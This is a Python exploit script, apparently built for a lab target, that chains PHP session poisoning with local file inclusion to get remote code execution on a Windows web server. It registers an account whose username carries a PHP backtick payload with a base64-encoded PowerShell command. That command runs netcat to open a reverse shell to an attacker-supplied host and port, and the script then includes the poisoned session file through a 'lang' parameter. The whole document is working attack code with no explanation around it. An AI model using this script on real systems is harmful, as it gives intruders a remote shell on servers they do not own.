import sys                                                                                                                                                                                   [0/4]
import requests                       
import argparse       
import secrets                                  
import string
import base64  
                                                
if len(sys.argv) != 4:
    print(f"Usage : {sys.argv[0]} <target ip> <lhost> <lport>")                                  
                                                
target = sys.argv[1]                            
lhost = sys.argv[2]   
lport = sys.argv[3]                                                                              
url_login = f'http://{target}/user/login.php'   
url_reg = f'http://{target}/user/registration.php'                                               
proxies = {"http":"http://127.0.0.1:8080"}
                                                
def powershell_encode():                     
    reverse_shell = f"C:\\temp\\nc.exe {lhost} {lport} -e powershell"
    bytes = reverse_shell.encode('utf-16-le')
    b64 = base64.b64encode(bytes)               
    encoded_payload = b64.decode()
    print("The encoded payload is: " + encoded_payload)              
    payload = f'<?=`powershell /enc {encoded_payload}`?>'                                        
    print("Registration Username :" + payload)
    return payload                
                                                                                                 
def PHP_session_poisoning():                                                                     
    payload = powershell_encode()             
    random = secrets.token_hex(10)
    data = {'email':f"{random}@test.ca", 'username':payload, 'password':random, 'submit':''}                                                                                              
    s = requests.session()  
    r = s.post(url_reg, data=data, proxies=proxies)                                              
    print("php session id =",s.cookies.get("PHPSESSID"))                                         
    data = {'username':payload, 'password':random, 'submit':''}                                                                                                                           
    r = s.post(url_login, data=data, proxies=proxies)                                            
    cookies = s.cookies.get("PHPSESSID") # retrieving php session id 
    return cookies, s                                                                            
                                                                                                 
def LFI2RCE():                                                                                   
    cookies, s = PHP_session_poisoning()                                                         
    url_lfi = f'http://{target}/blog/?lang=\\windows\\temp\\sess_{cookies}'                      
    r = s.get(url_lfi, proxies=proxies)         
                                                
LFI2RCE()
